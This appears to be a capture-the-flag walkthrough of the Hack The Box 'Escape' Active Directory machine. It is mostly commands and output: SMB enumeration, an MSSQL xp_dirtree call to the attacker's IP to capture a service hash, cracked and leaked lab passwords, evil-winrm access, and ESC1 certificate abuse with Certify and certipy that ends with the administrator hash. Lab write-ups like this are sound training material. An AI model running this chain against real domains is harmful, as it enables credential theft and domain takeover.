```
Escape is a Medium difficulty Windows Active Directory machine that starts with an SMB share that guest authenticated users can download a sensitive PDF file. Inside the PDF file temporary credentials are available for accessing an MSSQL service running on the machine. An attacker is able to force the MSSQL service to authenticate to his machine and capture the hash. It turns out that the service is running under a user account and the hash is crackable. Having a valid set of credentials an attacker is able to get command execution on the machine using WinRM. Enumerating the machine, a log file reveals the credentials for the user `ryan.cooper`. Further enumeration of the machine, reveals that a Certificate Authority is present and one certificate template is vulnerable to the ESC1 attack, meaning that users who are legible to use this template can request certificates for any other user on the domain including Domain Administrators. Thus, by exploiting the ESC1 vulnerability, an attacker is able to obtain a valid certificate for the Administrator account and then use it to get the hash of the administrator user.
```



```
target:10.10.11.202

domain:  sequel.htb,dc.sequel.htb
```
## scanning

```
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/ESCAPE]
└─$ cat nmap.txt            
# Nmap 7.94SVN scan initiated Mon Mar 11 05:58:19 2024 as: nmap -Pn -sC -sV -oN nmap.txt -vvv -p 53,88,9389,49667 10.10.11.202
Nmap scan report for 10.10.11.202
Host is up, received user-set (0.41s latency).
Scanned at 2024-03-11 05:58:19 EDT for 88s

PORT      STATE SERVICE      REASON  VERSION
53/tcp    open  domain       syn-ack (generic dns response: SERVFAIL)
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp    open  kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2024-03-11 17:58:33Z)
9389/tcp  open  mc-nmf       syn-ack .NET Message Framing
49667/tcp open  msrpc        syn-ack Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.94SVN%I=7%D=3/11%Time=65EED5C8%P=x86_64-pc-linux-gnu%r(D
SF:NSVersionBindReqTCP,20,"\0\x1e\0\x06\x81\x82\0\x01\0\0\0\0\0\0\x07versi
SF:on\x04bind\0\0\x10\0\x03");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 11 05:59:47 2024 -- 1 IP address (1 host up) scanned in 88.52 seconds
```

## enumeration
```
┌──(alienx㉿alienX)-[~/Desktop/MACHINES/ESCAPE]
└─$ smbclient -L 10.10.11.202
Password for [WORKGROUP\alienx]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Public          Disk      
        SYSVOL          Disk      Logon server share 
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.202 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available




from a pdf:

SQL SERVER
user:PublicUser
password:GuestUserCantWrite1

domain: sequel.htb

 sqsh -S 10.10.11.202 -U PublicUser -P GuestUserCantWrite1 (With this command we can login to sql)



```

## exploitation
```
exec master.dbo.xp_dirtree '\\10.10.16.14\test' (worked)

password:REGGIE1234ronnie


trying to login with evil-winrm

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/ESCAPE]
└─$ evil-winrm -i 10.10.11.202 -u sql_svc -p REGGIE1234ronnie -S

*Evil-WinRM* PS C:\Users> net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Brandon.Brown            Guest
James.Roberts            krbtgt                   Nicole.Thompson
Ryan.Cooper              sql_svc                  Tom.Henn


location of logs:**C:\WINDOWS\system32\config\**


sequel.htb\Ryan.Cooper

NuclearMosquito3
```


## privilege escalation
```
since we have many number of certificate we can use certify.exe to enumerate any vulnerable certificate

LINK:https://github.com/alien-keric/Ghostpack-CompiledBinaries 

now we can start enumeration possible certificate authorities with


*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Certify.exe cas  



ABUSE
To **find vulnerable certificate templates** you can run:


command:Certify.exe find /vulnerable

```


```
command: Certify.exe find /vulnerable


[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519


```


Exploiting ESC1
```
command: certipy-ad find -u ryan.cooper -p NuclearMosquito3 -dc-ip 10.10.11.202

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/ESCAPE/Certipy]
└─$ certipy-ad find -u ryan.cooper -p NuclearMosquito3 -dc-ip 10.10.11.202



command:  certipy-ad req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -upn administrator@sequel.htb -target sequel.htb -ca sequel-dc-ca -template UserAuthentication


┌──(alienx㉿alienX)-[~/Desktop/MACHINES/ESCAPE]
└─$ certipy-ad auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/ESCAPE]
└─$ sudo timedatectl set-ntp off 

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/ESCAPE]
└─$ certipy-ad auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/ESCAPE]
└─$ sudo ntpdate -u dc.sequel.htb         
2024-03-12 17:18:12.918028 (-0400) +28799.827503 +/- 0.141206 dc.sequel.htb 10.10.11.202 s1 no-leap
CLOCK: time stepped by 28799.827503

┌──(alienx㉿alienX)-[~/Desktop/MACHINES/ESCAPE]
└─$ certipy-ad auth -pfx administrator.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
```
